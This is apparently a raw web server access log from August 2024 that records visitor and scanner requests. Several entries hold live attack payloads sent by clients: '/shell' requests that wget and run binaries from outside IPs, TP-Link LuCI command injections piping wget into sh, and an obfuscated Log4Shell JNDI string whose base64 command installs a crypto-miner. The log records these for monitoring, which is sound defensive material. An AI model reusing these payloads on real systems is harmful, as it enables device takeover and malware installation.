 2024-08-09 00:57:15:040 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '220.196.160.84', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 00:57:15'}
 2024-08-09 03:26:22:895 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'url': '/login.do', 'method': 'GET', 'ip': '45.156.129.48', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 03:26:22'}
 2024-08-09 03:36:01:019 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0', 'url': '/', 'method': 'GET', 'ip': '180.163.30.76', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 03:36:01'}
 2024-08-09 04:06:10:826 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', 'url': '/', 'method': 'GET', 'ip': '185.224.128.43', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 04:06:10'}
 2024-08-09 04:06:34:266 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'KrebsOnSecurity', 'url': '/shell', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'cd+%2Ftmp%3Brm+earm+earm5+earm7%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm7%3Bchmod+777+earm7%3B.%2Fearm7+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm5%3Bchmod+777+earm5%3B.%2Fearm5+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm%3Bchmod+777+earm%3B.%2Fearm+jaws='}, 'ts': '2024-08-09 04:06:34'}
 2024-08-09 04:09:30:142 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0', 'url': '/', 'method': 'GET', 'ip': '5.8.11.202', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 04:09:30'}
 2024-08-09 04:31:50:729 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', 'url': '/', 'method': 'GET', 'ip': '46.174.191.32', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 04:31:50'}
 2024-08-09 04:59:37:063 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'mozilla/5.0 (iphone; cpu iphone os 13_5_1 like mac os x) applewebkit/605.1.15 (khtml, like gecko) mobile/15e148 micromessenger/7.0.15(0x17000f2b) nettype/4g language/zh_cn miniprogram', 'url': '/', 'method': 'GET', 'ip': '106.55.251.49', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 04:59:37'}
 2024-08-09 05:07:19:358 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '220.196.160.95', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 05:07:19'}
 2024-08-09 05:07:21:180 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/', 'method': 'POST', 'ip': '220.196.160.73', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 05:07:21'}
 2024-08-09 05:20:30:550 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1', 'url': '/', 'method': 'GET', 'ip': '220.196.160.125', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 05:20:30'}
 2024-08-09 05:20:32:006 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1', 'url': '/', 'method': 'POST', 'ip': '220.196.160.76', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 05:20:32'}
 2024-08-09 05:25:01:733 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Go-http-client/1.1', 'url': '', 'method': 'CONNECT', 'ip': '194.165.17.13', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 05:25:01'}
 2024-08-09 05:29:20:017 | thread_id:140536258598720 thread_name:MainThread | INFO | {'useragent': 'Linux Gnu (cow)', 'url': '/', 'method': 'GET', 'ip': '77.90.22.83', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 05:29:20'}
 2024-08-09 05:46:51:190 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//54.37.131.59:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuNHRoZXBvb2wudG9wL3NldHVwXzR0aGVwb29sX21pbmVyLnNoIHwgTENfQUxMPWVuX1VTLlVURi04IGJhc2ggLXMgNDk5YTZMTXZhbVdjdXFuVzd3bU1oNWlmTDFWU3o5YzNZUXAyUGNiQURGUDRhcjZhZDVldlBWUmV3QmZGcUhIUE5YVzRvclZlQVUxcmFVek1lVmZCUVozdFRwOEtaTEo=}')", 'url': "/t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//54.37.131.59:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuNHRoZXBvb2wudG9wL3NldHVwXzR0aGVwb29sX21pbmVyLnNoIHwgTENfQUxMPWVuX1VTLlVURi04IGJhc2ggLXMgNDk5YTZMTXZhbVdjdXFuVzd3bU1oNWlmTDFWU3o5YzNZUXAyUGNiQURGUDRhcjZhZDVldlBWUmV3QmZGcUhIUE5YVzRvclZlQVUxcmFVek1lVmZCUVozdFRwOEtaTEo=}')", 'method': 'GET', 'ip': '185.91.127.9', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 05:46:51'}
 2024-08-09 05:46:51:798 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'KrebsOnSecurity', 'url': '/shell', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'cd+%2Ftmp%3Brm+earm+earm5+earm7%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm7%3Bchmod+777+earm7%3B.%2Fearm7+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm5%3Bchmod+777+earm5%3B.%2Fearm5+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm%3Bchmod+777+earm%3B.%2Fearm+jaws='}, 'ts': '2024-08-09 05:46:51'}
 2024-08-09 05:47:50:007 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Go-http-client/1.1', 'url': '/cgi-bin/luci/;stok=/locale', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'form=country&operation=write&country=%24%28id%3E%60wget+-O-+http%3A%2F%2F154.216.18.103%2Ft%7Csh%3B%60%29'}, 'ts': '2024-08-09 05:47:50'}
 2024-08-09 06:13:51:679 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Linux; Android 8.0.0; BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '80.82.77.202', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 06:13:51'}
 2024-08-09 06:24:05:317 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (iPhone; CPU iPhone os 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/11D257 Safari/604.1', 'url': '/', 'method': 'GET', 'ip': '180.101.245.250', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 06:24:05'}
 2024-08-09 06:24:06:162 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1', 'url': '/', 'method': 'GET', 'ip': '220.196.160.125', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 06:24:06'}
 2024-08-09 06:24:08:235 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1', 'url': '/', 'method': 'POST', 'ip': '220.196.160.45', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 06:24:08'}
 2024-08-09 07:00:05:471 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 zgrab/0.x', 'url': '/', 'method': 'GET', 'ip': '65.38.121.214', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 07:00:05'}
 2024-08-09 07:02:32:502 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Linux Gnu (cow)', 'url': '/', 'method': 'GET', 'ip': '46.19.143.27', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 07:02:32'}
 2024-08-09 07:04:58:382 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'KrebsOnSecurity', 'url': '/shell', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'cd+%2Ftmp%3Brm+earm+earm5+earm7%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm7%3Bchmod+777+earm7%3B.%2Fearm7+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm5%3Bchmod+777+earm5%3B.%2Fearm5+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm%3Bchmod+777+earm%3B.%2Fearm+jaws='}, 'ts': '2024-08-09 07:04:58'}
 2024-08-09 07:38:32:658 | thread_id:140536258598720 thread_name:MainThread | INFO | {'useragent': 'curl/7.61.1', 'url': '/', 'method': 'GET', 'ip': '94.102.56.99', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 07:38:32'}
 2024-08-09 07:55:48:842 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Go-http-client/1.1', 'url': '/cgi-bin/luci/;stok=/locale', 'method': 'GET', 'ip': '154.213.185.140', 'request_data': {'query_params': 'form=country&operation=write&country=%24%28id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F45.66.231.213%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60%29'}, 'ts': '2024-08-09 07:55:48'}
 2024-08-09 08:09:35:369 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '83.97.73.245', 'request_data': {'query_params': 'XDEBUG_SESSION_START=phpstorm'}, 'ts': '2024-08-09 08:09:35'}
 2024-08-09 08:26:39:288 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'KrebsOnSecurity', 'url': '/shell', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'cd+%2Ftmp%3Brm+earm+earm5+earm7%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm7%3Bchmod+777+earm7%3B.%2Fearm7+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm5%3Bchmod+777+earm5%3B.%2Fearm5+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.20.232%2Fearm%3Bchmod+777+earm%3B.%2Fearm+jaws='}, 'ts': '2024-08-09 08:26:39'}
 2024-08-09 08:50:15:849 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com', 'url': '/', 'method': 'GET', 'ip': '147.185.132.78', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 08:50:15'}
 2024-08-09 08:51:42:218 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', 'url': '/', 'method': 'GET', 'ip': '185.224.128.43', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 08:51:42'}
 2024-08-09 09:05:07:026 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'curl/7.61.1', 'url': '/', 'method': 'GET', 'ip': '180.101.244.13', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:05:07'}
 2024-08-09 09:05:07:735 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'curl/7.61.1', 'url': '/', 'method': 'GET', 'ip': '59.83.208.107', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:05:07'}
 2024-08-09 09:05:09:506 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'curl/7.61.1', 'url': '/', 'method': 'POST', 'ip': '59.83.208.107', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:05:09'}
 2024-08-09 09:12:30:580 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'url': '/actuator/gateway/routes', 'method': 'GET', 'ip': '83.97.73.245', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:12:30'}
 2024-08-09 09:20:14:169 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '220.196.160.45', 'request_data': {'query_params': 'XDEBUG_SESSION_START=phpstorm'}, 'ts': '2024-08-09 09:20:14'}
 2024-08-09 09:20:14:523 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '220.196.160.101', 'request_data': {'query_params': 'XDEBUG_SESSION_START=phpstorm'}, 'ts': '2024-08-09 09:20:14'}
 2024-08-09 09:20:16:711 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'url': '/', 'method': 'POST', 'ip': '220.196.160.65', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:20:16'}
 2024-08-09 09:23:05:613 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30', 'url': '/', 'method': 'GET', 'ip': '83.76.34.221', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:23:05'}
 2024-08-09 09:32:23:286 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'url': '/.env', 'method': 'GET', 'ip': '94.156.68.162', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:32:23'}
 2024-08-09 09:44:39:153 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Go-http-client/1.1', 'url': '/cgi-bin/luci/;stok=/locale', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'form=country&operation=write&country=%24%28id%3E%60wget+-O-+http%3A%2F%2F154.216.18.103%2Ft%7Csh%3B%60%29'}, 'ts': '2024-08-09 09:44:39'}
 2024-08-09 09:45:20:013 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 zgrab/0.x', 'url': '/hudson', 'method': 'GET', 'ip': '57.151.48.146', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:45:20'}
 2024-08-09 09:47:01:456 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'KrebsOnSecurity', 'url': '/shell', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'cd+%2Ftmp%3Brm+earm+earm5+earm7%3Bnohup+wget+http%3A%2F%5C%2F154.216.18.103%2Fearm7%3Bchmod+777+earm7%3B.%2Fearm7+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.18.103%2Fearm5%3Bchmod+777+earm5%3B.%2Fearm5+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.18.103%2Fearm%3Bchmod+777+earm%3B.%2Fearm+jaws='}, 'ts': '2024-08-09 09:47:01'}
 2024-08-09 09:57:00:845 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0', 'url': '/1pxC', 'method': 'GET', 'ip': '148.153.56.86', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:57:00'}
 2024-08-09 09:57:01:159 | thread_id:140536258598720 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0', 'url': '/Vy5Y', 'method': 'GET', 'ip': '148.153.56.86', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:57:01'}
 2024-08-09 09:57:01:481 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0', 'url': '/aab8', 'method': 'GET', 'ip': '148.153.56.86', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:57:01'}
 2024-08-09 09:57:02:482 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0', 'url': '/jquery-3.3.1.slim.min.js', 'method': 'GET', 'ip': '148.153.56.86', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:57:02'}
 2024-08-09 09:57:03:534 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0', 'url': '/aab9', 'method': 'GET', 'ip': '148.153.56.86', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:57:03'}
 2024-08-09 09:57:03:873 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0', 'url': '/jquery-3.3.2.slim.min.js', 'method': 'GET', 'ip': '148.153.56.86', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 09:57:03'}
 2024-08-09 10:03:51:311 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 zgrab/0.x', 'url': '/', 'method': 'GET', 'ip': '45.33.109.18', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 10:03:51'}
 2024-08-09 10:08:15:394 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0', 'url': '/Vy5Y', 'method': 'GET', 'ip': '180.101.245.253', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 10:08:15'}
 2024-08-09 10:21:47:953 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '185.180.140.6', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 10:21:47'}
 2024-08-09 10:46:45:926 | thread_id:140128007952192 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 zgrab/0.x', 'url': '/actuator/health', 'method': 'GET', 'ip': '13.64.108.30', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 10:46:45'}
 2024-08-09 11:17:36:502 | thread_id:140536258598720 thread_name:MainThread | INFO | {'useragent': 'KrebsOnSecurity', 'url': '/shell', 'method': 'GET', 'ip': '185.224.128.83', 'request_data': {'query_params': 'cd+%2Ftmp%3Brm+earm+earm5+earm7%3Bnohup+wget+http%3A%2F%5C%2F154.216.18.103%2Fearm7%3Bchmod+777+earm7%3B.%2Fearm7+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.18.103%2Fearm5%3Bchmod+777+earm5%3B.%2Fearm5+jaws%3Bnohup+wget+http%3A%2F%5C%2F154.216.18.103%2Fearm%3Bchmod+777+earm%3B.%2Fearm+jaws='}, 'ts': '2024-08-09 11:17:36'}
 2024-08-09 11:19:45:289 | thread_id:140536258598720 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Linux; Android 9; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36', 'url': '/', 'method': 'GET', 'ip': '93.174.93.12', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 11:19:45'}
 2024-08-09 11:34:59:111 | thread_id:140504953993024 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/static/swagger-ui/swagger-ui-bundle.js', 'method': 'GET', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 11:34:59'}
 2024-08-09 11:34:59:111 | thread_id:140618541631296 thread_name:MainThread | INFO | {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'url': '/static/swagger-ui/swagger-ui.css', 'method': 'GET', 'ip': '122.193.87.109', 'request_data': {'query_params': ''}, 'ts': '2024-08-09 11:34:59'}
